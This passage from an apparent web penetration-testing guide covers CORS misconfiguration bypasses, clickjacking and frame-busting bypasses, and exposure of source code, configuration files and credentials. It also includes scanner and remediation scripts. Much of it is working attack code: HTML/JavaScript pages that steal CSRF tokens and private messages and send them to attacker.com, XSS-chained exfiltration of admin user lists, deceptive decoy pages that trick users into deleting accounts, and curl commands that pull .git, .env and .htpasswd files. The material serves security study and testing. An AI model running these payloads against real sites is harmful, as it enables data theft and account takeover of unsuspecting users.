# Access-Control-Allow-Origin: http://attacker.target.com
# Access-Control-Allow-Credentials: true
```

[**Inference:** If subdomain validation uses weak regex like `^https?://.*\.target\.com$`, attacker can register `attacker.target.com` or exploit subdomain takeover]

**4. Pre-domain Bypass:**

```bash
# Request
curl -H "Origin: http://target.com.evil.com" \
  http://target.com/api/data

# Vulnerable Response (if checking endsWith())
# Access-Control-Allow-Origin: http://target.com.evil.com
# Access-Control-Allow-Credentials: true
```

**5. Protocol Bypass:**

```bash
# If only HTTP checked, try HTTPS
curl -H "Origin: https://attacker.com" \
  http://target.com/api/data

# Vulnerable if protocol not validated
# Access-Control-Allow-Origin: https://attacker.com
# Access-Control-Allow-Credentials: true
```

**6. Wildcard with Credentials Misconfiguration:**

```bash
# Request
curl -H "Origin: http://evil.com" \
  http://target.com/api/data

# Response
# Access-Control-Allow-Origin: *
# Access-Control-Allow-Credentials: true
```

[**Note:** This is technically invalid per CORS spec - browsers reject it. However, it indicates misconfiguration and poor security understanding]

### Advanced CORS Exploitation

**Stealing CSRF tokens:**

```html
<html>
<body>
<script>
// Fetch page with CSRF token
fetch('http://target.com/account/settings', {
    credentials: 'include'
})
.then(r => r.text())
.then(html => {
    // Extract CSRF token
    const match = html.match(/name="csrf_token" value="([^"]+)"/);
    if (match) {
        const csrfToken = match[1];
        
        // Use token to perform action
        fetch('http://target.com/account/change-email', {
            method: 'POST',
            credentials: 'include',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            body: 'csrf_token=' + csrfToken + '&email=attacker@evil.com'
        });
    }
});
</script>
</body>
</html>
```

**Reading sensitive data:**

```html
<html>
<body>
<script>
async function stealData() {
    try {
        // Fetch sensitive API endpoint
        const response = await fetch('http://target.com/api/user/private-messages', {
            credentials: 'include'
        });
        
        const data = await response.json();
        
        // Exfiltrate via image request
        const img = new Image();
        img.src = 'http://attacker.com/log?data=' + 
                  encodeURIComponent(JSON.stringify(data));
        
    } catch(e) {
        console.error(e);
    }
}

stealData();
</script>
</body>
</html>
```

**Chaining with XSS:**

```javascript
// If XSS exists on subdomain
// And CORS allows subdomains
// Located at: http://forum.target.com/post?comment=<script>...</script>

fetch('http://api.target.com/admin/users', {
    credentials: 'include'
})
.then(r => r.json())
.then(users => {
    // Exfiltrate admin user list
    fetch('http://attacker.com/log', {
        method: 'POST',
        body: JSON.stringify(users)
    });
});
```

### CORS Testing Tools

**CORScanner:**

```bash
# Install
pip3 install corscanner

# Basic scan
corscanner -u http://target.com

# Scan with URLs from file
corscanner -i urls.txt -o results.json

# Verbose output
corscanner -u http://target.com -v
```

**Burp Extension - CORS Scanner:**

```
1. Burp Suite â†’ Extender â†’ BApp Store
2. Install "CORS Scanner"
3. Navigate target site
4. Right-click request â†’ Extensions â†’ CORS Scanner â†’ Scan
5. View results in CORS Scanner tab
```

**Custom comprehensive CORS tester:**

```python
#!/usr/bin/env python3
import requests
import re
from urllib.parse import urlparse

def comprehensive_cors_test(url):
    """Comprehensive CORS misconfiguration testing"""
    
    parsed = urlparse(url)
    domain = parsed.netloc
    
    # Generate test origins
    test_cases = {
        'arbitrary_origin': f'http://evil.com',
        'null_origin': 'null',
        'subdomain_prefix': f'http://attacker.{domain}',
        'domain_suffix': f'http://{domain}.evil.com',
        'https_upgrade': f'https://evil.com',
        'localhost': 'http://localhost',
        'file_origin': 'file://',
        'triple_w': f'http://www{domain}',  # For www.target.com
    }
    
    print(f"[*] Testing CORS on: {url}")
    print(f"[*] Domain: {domain}\n")
    
    vulnerabilities = []
    
    for test_name, origin in test_cases.items():
        headers = {'Origin': origin}
        
        try:
            resp = requests.get(url, headers=headers, timeout=5)
            
            acao = resp.headers.get('Access-Control-Allow-Origin', '')
            acac = resp.headers.get('Access-Control-Allow-Credentials', '')
            
            if not acao:
                continue
            
            print(f"[+] Test: {test_name}")
            print(f"    Origin: {origin}")
            print(f"    ACAO: {acao}")
            print(f"    ACAC: {acac}")
            
            # Vulnerability assessment
            if acao == origin:
                if acac == 'true':
                    vuln = f"CRITICAL: Origin {origin} reflected with credentials"
                    vulnerabilities.append(vuln)
                    print(f"    [!] {vuln}")
                else:
                    vuln = f"HIGH: Origin {origin} reflected (no credentials)"
                    vulnerabilities.append(vuln)
                    print(f"    [!] {vuln}")
            
            elif acao == '*':
                if acac == 'true':
                    vuln = "CRITICAL: Wildcard with credentials (invalid spec)"
                    vulnerabilities.append(vuln)
                    print(f"    [!] {vuln}")
                else:
                    print(f"    [i] Wildcard CORS (public API)")
            
            elif acao == 'null':
                vuln = "HIGH: Null origin accepted"
                if acac == 'true':
                    vuln = "CRITICAL: Null origin with credentials"
                vulnerabilities.append(vuln)
                print(f"    [!] {vuln}")
            
            print()
            
        except requests.exceptions.RequestException as e:
            print(f"[-] Error testing {test_name}: {e}\n")
    
    # Summary
    print("\n" + "="*60)
    print("SUMMARY")
    print("="*60)
    if vulnerabilities:
        print(f"[!] Found {len(vulnerabilities)} vulnerabilities:")
        for v in vulnerabilities:
            print(f"  - {v}")
    else:
        print("[+] No obvious CORS misconfigurations detected")
    
    return vulnerabilities

# Usage
if __name__ == "__main__":
    import sys
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <url>")
        sys.exit(1)
    
    comprehensive_cors_test(sys.argv[1])
```

### CORS Preflight Request Testing

**Preflight request (OPTIONS):**

```bash
# Send OPTIONS request
curl -X OPTIONS \
  -H "Origin: http://evil.com" \
  -H "Access-Control-Request-Method: POST" \
  -H "Access-Control-Request-Headers: Content-Type" \
  -v \
  http://target.com/api/data

# Look for:
# Access-Control-Allow-Origin: http://evil.com
# Access-Control-Allow-Methods: POST, GET, OPTIONS
# Access-Control-Allow-Headers: Content-Type
# Access-Control-Allow-Credentials: true
# Access-Control-Max-Age: 3600
```

**Testing allowed methods:**

```bash
# Test if dangerous methods allowed
curl -X OPTIONS \
  -H "Origin: http://evil.com" \ 
  -H "Access-Control-Request-Method: DELETE"  
-v  
http://target.com/api/data

# If DELETE reflected in Access-Control-Allow-Methods:

curl -X DELETE  
-H "Origin: http://evil.com"  
--cookie "session=valid_session_cookie"  
http://target.com/api/data/123
````

**Testing custom headers:**
```bash
# Test if custom security headers allowed
curl -X OPTIONS \
  -H "Origin: http://evil.com" \
  -H "Access-Control-Request-Headers: X-Custom-Header, Authorization" \
  -v \
  http://target.com/api/data

# If reflected, can send authenticated requests with custom headers
curl -X POST \
  -H "Origin: http://evil.com" \
  -H "Authorization: Bearer token123" \
  -H "Content-Type: application/json" \
  --cookie "session=abc123" \
  -d '{"action":"delete_account"}' \
  http://target.com/api/user
````

## X-Frame-Options Bypass

### X-Frame-Options Header Basics

**X-Frame-Options (XFO) values:**

- `DENY` - Page cannot be framed at all
- `SAMEORIGIN` - Page can only be framed by same origin
- `ALLOW-FROM uri` - Page can be framed by specified URI (deprecated)

**Modern alternative - Content-Security-Policy:**

```
Content-Security-Policy: frame-ancestors 'none'
Content-Security-Policy: frame-ancestors 'self'
Content-Security-Policy: frame-ancestors https://trusted.com
```

### Detecting X-Frame-Options

**Manual detection:**

```bash
# Check for X-Frame-Options header
curl -I http://target.com

# Look for:
# X-Frame-Options: DENY
# X-Frame-Options: SAMEORIGIN
# X-Frame-Options: ALLOW-FROM http://trusted.com

# Check CSP frame-ancestors
curl -I http://target.com | grep -i "Content-Security-Policy"
```

**Testing clickjacking vulnerability:**

```html
<!-- Basic iframe test -->
<!DOCTYPE html>
<html>
<head>
    <title>Clickjacking Test</title>
</head>
<body>
    <h1>Clickjacking Test</h1>
    <iframe src="http://target.com" width="800" height="600"></iframe>
</body>
</html>
```

**Automated header checking:**

```python
#!/usr/bin/env python3
import requests
import sys

def check_frame_options(url):
    """Check X-Frame-Options and CSP frame-ancestors"""
    
    try:
        response = requests.get(url, timeout=5)
        headers = response.headers
        
        print(f"[*] Checking: {url}\n")
        
        # Check X-Frame-Options
        xfo = headers.get('X-Frame-Options', '')
        if xfo:
            print(f"[+] X-Frame-Options: {xfo}")
            
            if xfo.upper() == 'DENY':
                print("    [i] Frames blocked completely")
            elif xfo.upper() == 'SAMEORIGIN':
                print("    [i] Only same-origin framing allowed")
            elif xfo.upper().startswith('ALLOW-FROM'):
                print("    [!] ALLOW-FROM is deprecated, may not work in modern browsers")
        else:
            print("[-] X-Frame-Options: NOT SET")
            print("    [!] VULNERABLE: No frame protection")
        
        # Check CSP frame-ancestors
        csp = headers.get('Content-Security-Policy', '')
        if 'frame-ancestors' in csp:
            print(f"[+] CSP frame-ancestors found")
            
            if "'none'" in csp:
                print("    [i] Frames blocked by CSP")
            elif "'self'" in csp:
                print("    [i] Only same-origin framing allowed by CSP")
            else:
                print(f"    [i] Custom frame-ancestors: {csp}")
        else:
            if not xfo:
                print("[-] No frame-ancestors in CSP")
                print("    [!] VULNERABLE: No frame protection at all")
        
        print()
        
        # Vulnerability summary
        if not xfo and 'frame-ancestors' not in csp:
            print("[!] VULNERABLE TO CLICKJACKING")
            print("[!] Neither X-Frame-Options nor CSP frame-ancestors set")
            return True
        
        return False
        
    except requests.exceptions.RequestException as e:
        print(f"[-] Error: {e}")
        return False

# Usage
if len(sys.argv) != 2:
    print(f"Usage: {sys.argv[0]} <url>")
    sys.exit(1)

check_frame_options(sys.argv[1])
```

### X-Frame-Options Bypass Techniques

**1. Missing X-Frame-Options on Subpages:**

```bash
# Main page protected
curl -I http://target.com
# X-Frame-Options: DENY

# Subpages not protected
curl -I http://target.com/admin/settings
curl -I http://target.com/api/endpoint
curl -I http://target.com/user/profile
# No X-Frame-Options header

# Test framing
```

```html
<!DOCTYPE html>
<html>
<body>
<iframe src="http://target.com/admin/settings" width="800" height="600"></iframe>
</body>
</html>
```

**2. Double Framing (IE/Edge Legacy Bypass):**

[**Inference:** This works on older browsers where top.location differs from parent.location checks]

```html
<!-- Attacker's outer page: http://attacker.com/outer.html -->
<!DOCTYPE html>
<html>
<body>
    <iframe src="http://attacker.com/inner.html" width="800" height="600"></iframe>
</body>
</html>

<!-- Attacker's inner page: http://attacker.com/inner.html -->
<!DOCTYPE html>
<html>
<body>
    <!-- Target with SAMEORIGIN can be framed because top.location check passes -->
    <iframe src="http://target.com" width="800" height="600"></iframe>
</body>
</html>
```

**3. XFO Header Injection via CRLF:**

```bash
# If application reflects input in headers
curl "http://target.com/redirect?url=http://evil.com%0d%0aX-Frame-Options:%20ALLOW-FROM%20http://attacker.com"

# Attempt to inject XFO header
# [Unverified]: Modern frameworks typically prevent CRLF injection
```

**4. Mobile Browser User-Agent Bypass:**

[**Inference:** Some applications disable XFO for mobile browsers, assuming mobile doesn't support framing]

```bash
# Test with mobile user-agent
curl -I http://target.com \
  -H "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"

# Check if XFO removed or changed
```

**5. Protocol Downgrade (HTTPS to HTTP):**

```bash
# HTTPS version has XFO
curl -I https://target.com
# X-Frame-Options: DENY

# HTTP version might not
curl -I http://target.com
# No X-Frame-Options

# Frame HTTP version if available
```

```html
<!DOCTYPE html>
<html>
<body>
    <iframe src="http://target.com" width="800" height="600"></iframe>
</body>
</html>
```

**6. Subdomain Bypass:**

```bash
# Main domain protected
curl -I https://target.com
# X-Frame-Options: SAMEORIGIN

# Subdomains might not be
curl -I https://api.target.com
curl -I https://cdn.target.com
curl -I https://static.target.com
# Check for missing XFO
```

**7. Sandbox Attribute with allow-forms:**

[**Inference:** Sandbox may bypass some JavaScript-based frame-busting, but doesn't bypass XFO header itself]

```html
<!DOCTYPE html>
<html>
<body>
    <!-- Sandbox prevents scripts but allows forms -->
    <iframe 
        sandbox="allow-forms allow-same-origin" 
        src="http://target.com/login" 
        width="800" 
        height="600">
    </iframe>
</body>
</html>
```

**8. Browser-Specific Bypasses:**

**IE11/Edge Legacy - Limited ALLOW-FROM:**

```html
<!-- Only works in IE/Old Edge -->
<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="X-Frame-Options" content="ALLOW-FROM http://attacker.com">
</head>
<body>
    <iframe src="http://target.com" width="800" height="600"></iframe>
</body>
</html>
```

**9. Proxy/Cache Manipulation:**

```bash
# If XFO only set on initial request
# Cache might serve version without header

# Try cache-busting parameters
curl -I http://target.com?v=12345
curl -I http://target.com?cb=98765

# Try different caching proxies
curl -I http://target.com -H "Cache-Control: no-cache"
```

**10. Same-Site Frame Bypass (XSS Required):**

```html
<!-- If XSS exists on same domain -->
<!-- http://target.com/forum/post?msg=<script>...</script> -->
<!DOCTYPE html>
<html>
<body>
    <!-- SAMEORIGIN allows framing from same origin -->
    <iframe src="http://target.com/forum/post?msg=<script>
        // Malicious JavaScript
        document.forms[0].submit();
    </script>" width="800" height="600"></iframe>
</body>
</html>
```

### Clickjacking Exploitation Techniques

**Basic clickjacking attack:**

```html
<!DOCTYPE html>
<html>
<head>
    <title>Free iPhone!</title>
    <style>
        iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            opacity: 0.0001; /* Nearly invisible */
            z-index: 2;
        }
        
        #decoy {
            position: absolute;
            top: 200px;
            left: 400px;
            z-index: 1;
        }
        
        button {
            width: 200px;
            height: 50px;
            font-size: 20px;
        }
    </style>
</head>
<body>
    <div id="decoy">
        <h1>Click here to claim your FREE iPhone!</h1>
        <button>CLAIM NOW!</button>
    </div>
    
    <!-- Iframe positioned so "Delete Account" button aligns with decoy -->
    <iframe src="http://target.com/account/delete"></iframe>
</body>
</html>
```

**Likejacking (social media):**

```html
<!DOCTYPE html>
<html>
<head>
    <style>
        iframe {
            position: absolute;
            top: -500px; /* Adjust to align Like button */
            left: -200px;
            opacity: 0.0001;
            z-index: 2;
        }
        
        #fake-content {
            position: relative;
            z-index: 1;
            padding: 50px;
        }
    </style>
</head>
<body>
    <div id="fake-content">
        <h1>Awesome Video!</h1>
        <p>Click play to watch...</p>
        <button style="width: 100px; height: 50px;">â–¶ PLAY</button>
    </div>
    
    <!-- Facebook Like button positioned over Play button -->
    <iframe src="https://www.facebook.com/plugins/like.php?href=http://attacker.com/malicious-page" 
            width="450" 
            height="800"></iframe>
</body>
</html>
```

**Cursorjacking (advanced):**

```html
<!DOCTYPE html>
<html>
<head>
    <style>
        /* Hide real cursor */
        * {
            cursor: none !important;
        }
        
        /* Fake cursor image */
        #fake-cursor {
            position: absolute;
            width: 20px;
            height: 20px;
            background: url('cursor.png');
            pointer-events: none;
            z-index: 9999;
        }
        
        iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            opacity: 0.0001;
            z-index: 2;
        }
    </style>
</head>
<body>
    <div id="fake-cursor"></div>
    
    <script>
        // Display fake cursor offset from real position
        document.addEventListener('mousemove', function(e) {
            const fakeCursor = document.getElementById('fake-cursor');
            // Offset by 50px so user thinks they're clicking elsewhere
            fakeCursor.style.left = (e.pageX + 50) + 'px';
            fakeCursor.style.top = (e.pageY + 50) + 'px';
        });
    </script>
    
    <iframe src="http://target.com/dangerous-action"></iframe>
</body>
</html>
```

**Multi-step clickjacking:**

```html
<!DOCTYPE html>
<html>
<head>
    <style>
        .step {
            display: none;
            position: absolute;
            top: 100px;
            left: 100px;
        }
        
        .step.active {
            display: block;
        }
        
        iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            opacity: 0.0001;
            z-index: 2;
        }
    </style>
</head>
<body>
    <div id="step1" class="step active">
        <h2>Step 1: Enter your email</h2>
        <button onclick="nextStep(2)">Next</button>
    </div>
    
    <div id="step2" class="step">
        <h2>Step 2: Confirm your email</h2>
        <button onclick="nextStep(3)">Confirm</button>
    </div>
    
    <div id="step3" class="step">
        <h2>Step 3: Complete registration</h2>
        <button>Finish</button>
    </div>
    
    <script>
        function nextStep(step) {
            document.querySelectorAll('.step').forEach(el => {
                el.classList.remove('active');
            });
            document.getElementById('step' + step).classList.add('active');
            
            // Reposition iframe for next click
            const iframe = document.querySelector('iframe');
            if (step === 2) {
                iframe.style.top = '-100px';
            } else if (step === 3) {
                iframe.style.top = '-200px';
            }
        }
    </script>
    
    <!-- Multi-step process in iframe -->
    <iframe src="http://target.com/account/delete-wizard"></iframe>
</body>
</html>
```

**Drag-and-drop clickjacking:**

```html
<!DOCTYPE html>
<html>
<head>
    <style>
        #draggable {
            width: 100px;
            height: 100px;
            background: blue;
            cursor: move;
            position: absolute;
            top: 100px;
            left: 100px;
            z-index: 1;
        }
        
        iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            opacity: 0.0001;
            z-index: 2;
        }
    </style>
</head>
<body>
    <div id="draggable" draggable="true">
        Drag me!
    </div>
    
    <!-- Iframe with file upload positioned at drop zone -->
    <iframe src="http://target.com/upload"></iframe>
    
    <script>
        // User drags the element
        // Actually drops it onto file upload in iframe
        // Uploads attacker's file
    </script>
</body>
</html>
```

### Frame-Busting Bypasses

**JavaScript frame-busting code (old defense):**

```javascript
// Common frame-busting scripts
if (top !== self) {
    top.location = self.location;
}

if (window.top !== window.self) {
    window.top.location.href = window.self.location.href;
}

if (parent.frames.length > 0) {
    top.location.replace(document.location);
}
```

**Bypass using sandbox attribute:**

```html
<!-- Sandbox blocks scripts, preventing frame-busting -->
<iframe sandbox="allow-forms" src="http://target.com"></iframe>

<!-- If forms need submission -->
<iframe sandbox="allow-forms allow-scripts allow-top-navigation-by-user-activation" 
        src="http://target.com"></iframe>
```

**Bypass using onBeforeUnload:**

```html
<!DOCTYPE html>
<html>
<head>
    <script>
        // Prevent navigation from frame-buster
        window.onbeforeunload = function() {
            return "Are you sure you want to leave?";
        };
    </script>
</head>
<body>
    <iframe src="http://target.com"></iframe>
</body>
</html>
```

**Bypass using 204 No Content:**

[**Inference:** Some older frame-busting scripts can be bypassed if top.location returns 204]

```bash
# Setup attacker server to return 204
# When frame-buster tries: top.location = self.location
# Top frame receives 204 and doesn't navigate

# Server response:
HTTP/1.1 204 No Content
```

**Bypass using window.open:**

```html
<!DOCTYPE html>
<html>
<body>
    <script>
        // Open in new window without opener reference
        const win = window.open('', '_blank');
        win.document.write('<iframe src="http://target.com" width="100%" height="100%"></iframe>');
    </script>
</body>
</html>
```

### Advanced Clickjacking Detection Tools

**Custom comprehensive tester:**

```python
#!/usr/bin/env python3
import requests
from bs4 import BeautifulSoup
import re

def test_clickjacking(url):
    """Comprehensive clickjacking vulnerability test"""
    
    print(f"[*] Testing: {url}\n")
    
    try:
        response = requests.get(url, timeout=5)
        headers = response.headers
        
        # Check protection headers
        xfo = headers.get('X-Frame-Options', '')
        csp = headers.get('Content-Security-Policy', '')
        
        vulnerable = True
        protections = []
        bypasses = []
        
        # X-Frame-Options check
        if xfo:
            protections.append(f"X-Frame-Options: {xfo}")
            
            if xfo.upper() == 'DENY':
                vulnerable = False
                print("[+] X-Frame-Options: DENY (Strong protection)")
            elif xfo.upper() == 'SAMEORIGIN':
                vulnerable = False
                print("[+] X-Frame-Options: SAMEORIGIN (Protected)")
                bypasses.append("XSS on same domain")
                bypasses.append("Double framing (legacy browsers)")
            elif 'ALLOW-FROM' in xfo.upper():
                print("[!] X-Frame-Options: ALLOW-FROM (Deprecated)")
                bypasses.append("ALLOW-FROM not supported in modern browsers")
        else:
            print("[-] X-Frame-Options: NOT SET")
        
        # CSP frame-ancestors check
        if 'frame-ancestors' in csp:
            if "'none'" in csp:
                vulnerable = False
                protections.append("CSP: frame-ancestors 'none'")
                print("[+] CSP: frame-ancestors 'none' (Strong protection)")
            elif "'self'" in csp:
                vulnerable = False
                protections.append("CSP: frame-ancestors 'self'")
                print("[+] CSP: frame-ancestors 'self' (Protected)")
                bypasses.append("XSS on same domain")
            else:
                protections.append(f"CSP: frame-ancestors (custom)")
                print(f"[+] CSP: frame-ancestors found (custom policy)")
        else:
            print("[-] CSP frame-ancestors: NOT SET")
        
        # JavaScript frame-busting detection
        soup = BeautifulSoup(response.text, 'html.parser')
        scripts = soup.find_all('script')
        
        frame_buster_patterns = [
            r'top\s*!==\s*self',
            r'top\s*!=\s*self',
            r'window\.top\s*!==\s*window\.self',
            r'top\.location',
            r'parent\.frames\.length',
        ]
        
        has_frame_buster = False
        for script in scripts:
            if script.string:
                for pattern in frame_buster_patterns:
                    if re.search(pattern, script.string):
                        has_frame_buster = True
                        protections.append("JavaScript frame-busting detected")
                        print("[+] JavaScript frame-busting code found")
                        bypasses.append("Sandbox iframe attribute")
                        bypasses.append("onbeforeunload handler")
                        break
                if has_frame_buster:
                    break
        
        # Vulnerability assessment
        print("\n" + "="*60)
        if vulnerable and not protections:
            print("[!] VULNERABLE TO CLICKJACKING")
            print("[!] No frame protection detected")
        elif vulnerable and has_frame_buster:
            print("[!] POTENTIALLY VULNERABLE")
            print("[!] Only JavaScript protection (can be bypassed)")
        elif not vulnerable:
            print("[+] PROTECTED against clickjacking")
            
        if protections:
            print("\n[*] Protections found:")
            for p in protections:
                print(f"  - {p}")
        
        if bypasses:
            print("\n[*] Potential bypass techniques:")
            for b in bypasses:
                print(f"  - {b}")
        
        print("="*60)
        
        return vulnerable
        
    except requests.exceptions.RequestException as e:
        print(f"[-] Error: {e}")
        return None

# Usage
if __name__ == "__main__":
    import sys
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <url>")
        sys.exit(1)
    
    test_clickjacking(sys.argv[1])
```

**Burp Suite Clickbandit:**

```
1. Burp Suite â†’ Burp Clickbandit (built-in)
2. Click "Copy Clickbandit to clipboard"
3. Navigate to target site in browser
4. Open browser console (F12)
5. Paste Clickbandit code and press Enter
6. Click "Start" and interact with the page
7. Click "Finish" to generate clickjacking PoC
8. Save generated HTML
```

### Remediation Testing

**Verify proper CSP implementation:**

```bash
# Test CSP header
curl -I https://target.com | grep -i "content-security-policy"

# Should include:
# Content-Security-Policy: frame-ancestors 'none'
# Or: frame-ancestors 'self'
# Or: frame-ancestors https://trusted-domain.com

# Verify it blocks framing
# Try to frame the page and check browser console for CSP violation
```

**Test multiple endpoints:**

```bash
#!/bin/bash
# test_all_endpoints.sh

urls=(
    "http://target.com/"
    "http://target.com/login"
    "http://target.com/admin"
    "http://target.com/api/endpoint"
    "http://target.com/user/settings"
)

for url in "${urls[@]}"; do
    echo "Testing: $url"
    xfo=$(curl -s -I "$url" | grep -i "x-frame-options" | cut -d' ' -f2-)
    csp=$(curl -s -I "$url" | grep -i "content-security-policy" | grep -i "frame-ancestors")
    
    if [ -z "$xfo" ] && [ -z "$csp" ]; then
        echo "  [!] VULNERABLE - No protection"
    else
        echo "  [+] Protected:"
        [ -n "$xfo" ] && echo "      XFO: $xfo"
        [ -n "$csp" ] && echo "      CSP: frame-ancestors found"
    fi
    echo
done
```

## Important Related Topics

**CSRF (Cross-Site Request Forgery)** - Often combined with clickjacking; frame user interactions to trigger state-changing requests

**UI Redressing** - Broader category including clickjacking, likejacking, cursorjacking, and similar overlay attacks

**Postmessage Vulnerabilities** - Insecure cross-frame communication can be exploited alongside frame-based attacks

**Content Security Policy (CSP) Bypass** - Advanced techniques to bypass CSP protections including frame-ancestors

**OAuth/SAML Clickjacking** - Exploiting authorization flows through framing and social engineering

---

# Sensitive Data Exposure

## Information Disclosure

Information disclosure vulnerabilities occur when applications unintentionally reveal sensitive data through error messages, debug output, headers, or accessible resources.

### Types of Information Disclosure

**Error-Based Disclosure**

- Stack traces revealing framework versions, file paths, internal architecture
- Database error messages exposing query structure, table/column names
- Verbose exception handlers showing configuration details

**Debug Information Leakage**

- Development mode enabled in production
- Debug parameters accessible (`?debug=true`, `?test=1`)
- Profiling endpoints exposing internal metrics

**Version/Technology Fingerprinting**

- Server headers revealing exact software versions
- Framework-specific error pages
- Default error documents with version strings

### Detection Techniques

**Manual Testing**

```bash
# Check server headers
curl -I https://target.com

# Test for verbose errors
curl "https://target.com/page?id=invalid'"
curl "https://target.com/nonexistent"

# Look for debug parameters
curl "https://target.com/?debug=1"
curl "https://target.com/?test=true"
curl "https://target.com/?verbose=1"
```

**Automated Scanning**

```bash
# Nikto for information disclosure
nikto -h https://target.com -Tuning x

# Nuclei templates for info disclosure
nuclei -u https://target.com -t exposures/

# ffuf for debug parameters
ffuf -u "https://target.com/FUZZ" -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -mc 200,500
```

**Response Analysis**

- Compare responses between valid/invalid inputs
- Trigger errors with malformed data (SQL quotes, XSS payloads)
- Test boundary conditions (negative numbers, extremely large values)

### Common Disclosure Vectors

**PHP Information Disclosure**

```bash
# Test for phpinfo()
curl https://target.com/phpinfo.php
curl https://target.com/info.php
curl https://target.com/test.php

# Expose PHP errors
curl "https://target.com/page.php?id=1'" 

# Check for .phps files (highlighted source)
curl https://target.com/index.phps
```

**ASP.NET Disclosure**

```bash
# Trigger detailed errors (requires customErrors=Off)
curl "https://target.com/page.aspx?id=abc"

# Trace.axd endpoint
curl https://target.com/trace.axd

# Elmah error logging
curl https://target.com/elmah.axd
```

**Framework-Specific Endpoints**

```bash
# Django debug mode
curl https://target.com/__debug__/

# Flask/Werkzeug debugger
# Look for PIN-protected debug consoles in error pages

# Spring Boot actuators
curl https://target.com/actuator
curl https://target.com/actuator/env
curl https://target.com/actuator/health
curl https://target.com/actuator/mappings
```

### Exploitation Methodology

1. **Enumerate Error Handling**
    
    - Submit invalid data types
    - Test authentication with wrong credentials
    - Access non-existent resources
2. **Extract Technical Details**
    
    - Document framework/library versions
    - Map internal file structure from paths
    - Identify database type from error syntax
3. **Pivot to Further Attacks**
    
    - Use disclosed paths for LFI/directory traversal
    - Target specific CVEs based on versions
    - Craft attacks using internal knowledge

## Source Code Exposure

### Backup File Discovery

**Common Backup Extensions**

```bash
# Wordlist of backup extensions
.bak .backup .old .orig .save .swp .tmp
.copy .zip .tar.gz .rar ~
.1 .2 _backup _old

# Automated backup discovery with ffuf
ffuf -u https://target.com/FUZZ -w backup-extensions.txt -mc 200

# Specific file targeting
curl https://target.com/index.php.bak
curl https://target.com/config.php.old
curl https://target.com/login.php~
```

**Editor Temporary Files**

```bash
# Vim swap files
curl https://target.com/.index.php.swp
curl https://target.com/.config.php.swp

# Emacs backup files
curl https://target.com/index.php~
curl https://target.com/#index.php#

# Nano backup files
curl https://target.com/config.php.save
```

**Archive Exposure**

```bash
# Check for exposed archives
curl https://target.com/backup.zip
curl https://target.com/www.tar.gz
curl https://target.com/site.rar
curl https://target.com/backup.sql

# Extract and analyze
wget https://target.com/backup.zip
unzip backup.zip
grep -r "password" .
grep -r "api_key" .
```

### Version Control Exposure

**Git Repository Disclosure**

```bash
# Check for .git directory
curl https://target.com/.git/HEAD
curl https://target.com/.git/config

# Download exposed git repository
wget -r https://target.com/.git/
# Or use specialized tools
git-dumper https://target.com/.git/ output/
githack --url https://target.com/.git/ --output-folder output/

# Analyze downloaded repository
cd output/
git log
git show HEAD
git branch -a
git remote -v

# Search for secrets in history
git log -p | grep -i "password\|secret\|key"
trufflehog git file://. --only-verified
```

**SVN Repository Disclosure**

```bash
# Check for .svn
curl https://target.com/.svn/entries
curl https://target.com/.svn/wc.db

# Download SVN repository
svn-extractor https://target.com/.svn/ output/

# Extract from wc.db (SQLite database)
sqlite3 wc.db "SELECT * FROM NODES;"
```

**Other VCS Exposures**

```bash
# Mercurial (.hg)
curl https://target.com/.hg/requires
curl https://target.com/.hg/store/00manifest.i

# Bazaar (.bzr)
curl https://target.com/.bzr/README

# CVS
curl https://target.com/CVS/Entries
curl https://target.com/CVS/Root
```

### Configuration File Exposure

**Web Server Configs**

```bash
# Apache
curl https://target.com/.htaccess
curl https://target.com/.htpasswd

# Nginx
curl https://target.com/nginx.conf

# IIS
curl https://target.com/web.config
```

**Application Configs**

```bash
# General config files
curl https://target.com/config.php
curl https://target.com/configuration.php
curl https://target.com/settings.php
curl https://target.com/config.json
curl https://target.com/config.xml

# Framework-specific
curl https://target.com/.env              # Laravel, Node.js
curl https://target.com/settings.py       # Django
curl https://target.com/application.properties  # Spring
curl https://target.com/web.config       # ASP.NET
```

### Exposed Development Files

```bash
# IDE project files
curl https://target.com/.idea/workspace.xml
curl https://target.com/.vscode/settings.json
curl https://target.com/.project
curl https://target.com/.classpath

# Dependency manifests
curl https://target.com/composer.json
curl https://target.com/package.json
curl https://target.com/requirements.txt
curl https://target.com/Gemfile

# Build files
curl https://target.com/Gruntfile.js
curl https://target.com/gulpfile.js
curl https://target.com/webpack.config.js
```

## Credentials in Comments

### HTML Comment Extraction

**Manual Inspection**

```bash
# Download and search HTML comments
curl https://target.com | grep -oP '<!--.*?-->' 

# More readable output
curl https://target.com | grep -E '<!--.*?-->' | sed 's/<!--/\n<!--/g'
```

**Automated Comment Extraction**

```bash
# Using grep recursively on saved pages
wget -r -l 2 https://target.com
grep -r "<!--" target.com/ | grep -iE "password|user|admin|key|token|secret"

# Using html-tool
cat page.html | pup 'comment()' 

# Custom script
cat page.html | grep -oP '<!--\K.*?(?=-->)'
```

**Common Credential Patterns in Comments**

- `<!-- username: admin, password: P@ssw0rd -->`
- `<!-- TODO: remove default credentials -->`
- `<!-- DEBUG: API_KEY=abc123 -->`
- `<!-- Old password: ... -->`
- `<!-- Admin panel: /secret_admin_panel -->`

### JavaScript Comment Analysis

**Client-Side JavaScript**

```bash
# Download all JS files
wget -r -l 1 -A.js https://target.com

# Search for credentials
grep -r "password\|token\|api_key\|secret" *.js

# Look for specific patterns
grep -rE "(password|pwd|pass)\s*[:=]\s*['\"]" *.js
grep -rE "api[_-]?key\s*[:=]\s*['\"]" *.js
```

**Beautify Minified Code**

```bash
# Install js-beautify
pip install jsbeautifier

# Beautify and search
js-beautify app.min.js > app.js
grep -i "password\|credential" app.js
```

**Common JS Credential Locations**

- Hardcoded in authentication functions
- API endpoint URLs with embedded tokens
